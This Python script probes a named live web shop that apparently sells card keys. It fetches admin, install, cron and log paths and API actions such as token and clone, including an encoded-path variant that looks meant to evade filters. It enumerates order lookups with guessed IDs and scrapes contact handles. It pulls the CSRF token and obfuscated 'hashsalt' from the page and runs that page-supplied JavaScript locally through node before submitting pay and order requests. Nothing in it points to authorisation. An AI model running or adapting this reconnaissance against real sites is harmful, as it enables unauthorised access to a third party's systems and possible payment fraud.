#!/usr/bin/env python3
import re,subprocess,json,time
from pathlib import Path
from urllib.parse import quote
HOST='shenyuan.lol'; BASE=f'https://{HOST}/shop'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT=Path('/tmp/shenyuan_out'); OUT.mkdir(exist_ok=True)

class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr):
        for line in hdr.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()

def curl(path, method='GET', data=None, headers=None, t=25):
    url=path if path.startswith('http') else f'https://{HOST}{path}'
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/','--connect-timeout','10']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+10)
    text=(p.stdout or b'').decode('utf-8','replace')
    hdr,body=(text.split('\r\n\r\n',1)+[''])[:2] if '\r\n\r\n' in text else (text,'')
    jar.absorb(hdr)
    code_m=re.search(r'HTTP/\S+\s+(\d+)',hdr)
    return int(code_m.group(1)) if code_m else 0, body

xhr={'X-Requested-With':'XMLHttpRequest'}
code,body=curl('/shop/')
print('HOME',code,len(body), re.search(r'<title>([^<]+)',body).group(1) if re.search(r'<title>',body) else None)
(OUT/'home.html').write_text(body)

_,gc=curl('/shop/ajax.php?act=getcount',method='POST',data='',headers=xhr)
print('GC',gc); (OUT/'getcount.json').write_text(gc)

print('=== SUCCESS_CASES ===')
for q in ['1','12','2026','a']:
    code,body=curl(f'/shop/?mod=query&data={q}')
    print(f'QD93 {q}',code,len(body),'faka',('mod=faka' in body),'showOrder',('showOrder' in body),'kami',('卡密' in body))
for basep in ['/shop/api.php','/shop/%61pi.php']:
    for i in [1,2,10]:
        code,body=curl(f'{basep}?act=search&id={i}',headers=xhr)
        print(f'SEARCH {basep} id={i}',code,body[:160].replace('\n',' '))
    code,body=curl(f'{basep}?act=search',method='POST',data='id=1',headers=xhr)
    print(f'SEARCH_POST {basep}',code,body[:160].replace('\n',' '))
for p in ['/user/order/Query_Km','/index/order/Query_Km']:
    code,body=curl(p,method='POST',data='value=null')
    print(f'YK {p}',code,len(body), 'km', len(re.findall('Query_Km',body)))

print('=== API SURFACES ===')
for basep in ['/shop/api.php','/shop/%61pi.php']:
    for act,data in [('getcount',''),('goodslist',''),('classlist',''),('siteinfo',''),('tools','key='),('token','key=x'),('clone','key=x'),('search','id=1')]:
        code,body=curl(f'{basep}?act={act}',method='POST',data=data,headers=xhr)
        print(f'{basep} {act}',code,body[:180].replace('\n',' '))
        if act in ('goodslist','siteinfo','getcount') and body.startswith('{'):
            (OUT/f'{act}_{ "api" if "api.php" in basep and "%61" not in basep else "61"}.json').write_text(body)

print('=== AJAX ===')
for a,data in [('query','querytype=1&qq=1&page=1'),('query','querytype=2&qq=1&pwd='),('query','type=1&qq=20260803120000000'),
              ('pay','tid=1&inputvalue=recon1&num=1'),('card_check','card=test'),('captcha',''),('order','id=1&skey=0'*2)]:
    code,body=curl(f'/shop/ajax.php?act={a}',method='POST',data=data,headers=xhr)
    print(f'A {a} [{data[:50]}]',code,body[:220].replace('\n',' '))
    if a=='query' and 'qq=1&page' in data:
        (OUT/'query_qq1.json').write_text(body)

print('=== PATHS ===')
for p in ['/shop/?mod=buy&tid=1','/shop/?mod=query','/shop/toollogs.php','/shop/cron.php','/shop/install/','/shop/admin/','/','/shop/other/getshop.php']:
    code,body=curl(p)
    print(f'P {code} {p} len={len(body)} sn={body[:70].replace(chr(10)," ")}')

code,buy=curl('/shop/?mod=buy&tid=1')
print('BUY',code,len(buy),'hashsalt','hashsalt' in buy,'csrf','csrf_token' in buy)
(OUT/'buy1.html').write_text(buy)
csrf=re.search(r'name="csrf_token"[^>]*value="([^"]+)"',buy)
print('CSRF', csrf.group(1) if csrf else None)
# JSFuck hashsalt?
m=re.search(r'hashsalt\s*=\s*(.+?);', buy)
if m:
    expr=m.group(1).strip()
    print('HASH_EXPR_LEN', len(expr), expr[:80])
    if expr.startswith("'") or expr.startswith('"'):
        print('HASH_LIT', expr[:40])
    elif expr.startswith('(') or '+[]' in expr or '!' in expr:
        try:
            val=subprocess.check_output(['node','-e',f'console.log({expr})'],timeout=15).decode().strip()
            print('HASH_EVAL', val)
        except Exception as e:
            print('HASH_EVAL_FAIL', e)

# parse home for goods tids / contacts
home=(OUT/'home.html').read_text(encoding='utf-8',errors='ignore')
tids=sorted(set(re.findall(r'mod=buy&tid=(\d+)', home)))
print('TIDS', tids[:30], 'n', len(tids))
print('CONTACTS', re.findall(r't\.me/\w+|@[A-Za-z0-9_]{4,}|kfqq["\']?\s*[:=]\s*["\']?\d+', home)[:10])
# announce / sitename
for pat in ['sitename','title','build','version','yxts']:
    ms=re.findall(rf'{pat}["\']?\s*[:=]\s*["\']([^"\']+)', home, re.I)
    if ms: print(pat, ms[:5])
print('TITLE', re.search(r'<title>([^<]+)', home).group(1) if re.search(r'<title>',home) else None)

# try pay with csrf if any
if csrf:
    for tid in (tids[:3] or ['1']):
        data=f'tid={tid}&inputvalue=recon1&num=1&csrf_token={csrf.group(1)}'
        code,body=curl('/shop/ajax.php?act=pay',method='POST',data=data,headers=xhr)
        print(f'PAY_CSRF tid={tid}', body[:250].replace('\n',' '))

# getshop
code,body=curl('/shop/other/getshop.php',method='POST',data='orderid=20260803120000000')
print('GETSHOP',code,body[:200].replace('\n',' '))

print('DONE')
